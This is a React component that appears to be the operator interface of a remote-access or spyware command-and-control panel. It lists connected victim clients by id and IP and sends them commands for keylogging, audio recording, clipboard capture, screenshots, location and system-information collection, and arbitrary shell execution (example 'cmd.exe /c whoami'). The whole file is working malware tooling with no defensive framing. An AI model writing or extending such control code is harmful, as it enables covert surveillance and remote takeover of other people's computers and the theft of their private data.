import React, { useState, useEffect } from 'react';
import { api } from '../api';

const CAPABILITIES = {
  1: { name: 'Audio Recorder', needsArgs: false, hint: 'Records audio from the client' },
  2: { name: 'Clipboard Monitor', needsArgs: false, hint: 'Captures clipboard content' },
  3: { name: 'Keylogger', needsArgs: false, hint: 'Logs keystrokes' },
  4: { name: 'Screenshot', needsArgs: false, hint: 'Takes a screenshot' },
  5: { name: 'Info Collector', needsArgs: false, hint: 'Collects system information' },
  6: { name: 'Command Executor', needsArgs: true, hint: 'Executes a shell command', placeholder: 'cmd.exe /c whoami' },
  7: { name: 'Location Collector', needsArgs: false, hint: 'Collects location data' }
};

function Commands() {
  const [clients, setClients] = useState([]);
  const [selectedClient, setSelectedClient] = useState('');
  const [selectedCapability, setSelectedCapability] = useState('5');
  const [args, setArgs] = useState('');
  const [message, setMessage] = useState(null);
  const [sending, setSending] = useState(false);

  useEffect(() => {
    fetchClients();
  }, []);

  const fetchClients = async () => {
    try {
      const data = await api.getClients();
      setClients(Object.values(data.clients || {}));
    } catch (error) {
      console.error('Error fetching clients:', error);
    }
  };

  const handleSend = async (e) => {
    e.preventDefault();
    
    if (!selectedClient) {
      setMessage({ type: 'error', text: 'Please select a client' });
      return;
    }

    const capability = CAPABILITIES[selectedCapability];
    if (capability.needsArgs && !args.trim()) {
      setMessage({ type: 'error', text: 'This capability requires arguments' });
      return;
    }

    setSending(true);
    setMessage(null);

    try {
      await api.sendCommand(selectedClient, parseInt(selectedCapability), args);
      setMessage({ 
        type: 'success', 
        text: `✓ Command sent: ${capability.name}` 
      });
      setArgs('');
      setTimeout(() => setMessage(null), 5000);
    } catch (error) {
      setMessage({ 
        type: 'error', 
        text: `Failed: ${error.response?.data?.message || error.message}` 
      });
    } finally {
      setSending(false);
    }
  };

  const capability = CAPABILITIES[selectedCapability];

  return (
    <div>
      <div className="card">
        <h2>Send Command</h2>
        
        {message && (
          <div className={`alert ${message.type}`}>
            {message.text}
          </div>
        )}

        <form onSubmit={handleSend}>
          <div className="form-group">
            <label>Select Client</label>
            <select
              value={selectedClient}
              onChange={(e) => setSelectedClient(e.target.value)}
              required
            >
              <option value="">-- Choose a client --</option>
              {clients.map((client) => (
                <option key={client.id} value={client.id}>
                  {client.id} - {client.ip}
                </option>
              ))}
            </select>
          </div>

          <div className="form-group">
            <label>Select Capability</label>
            <select
              value={selectedCapability}
              onChange={(e) => setSelectedCapability(e.target.value)}
              required
            >
              {Object.entries(CAPABILITIES).map(([id, cap]) => (
                <option key={id} value={id}>
                  {cap.name}
                </option>
              ))}
            </select>
            <small>{capability.hint}</small>
          </div>

          {capability.needsArgs && (
            <div className="form-group">
              <label>Command Arguments</label>
              <input
                type="text"
                value={args}
                onChange={(e) => setArgs(e.target.value)}
                placeholder={capability.placeholder}
                required
              />
            </div>
          )}

          <button type="submit" className="btn" disabled={sending}>
            {sending ? 'Sending...' : 'Send Command'}
          </button>
        </form>
      </div>

      <div className="card">
        <h2>Available Capabilities</h2>
        <div className="info-block">
          {Object.entries(CAPABILITIES).map(([id, cap]) => (
            <div key={id}>
              <strong>{id}.</strong> {cap.name} - {cap.hint}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

export default Commands;
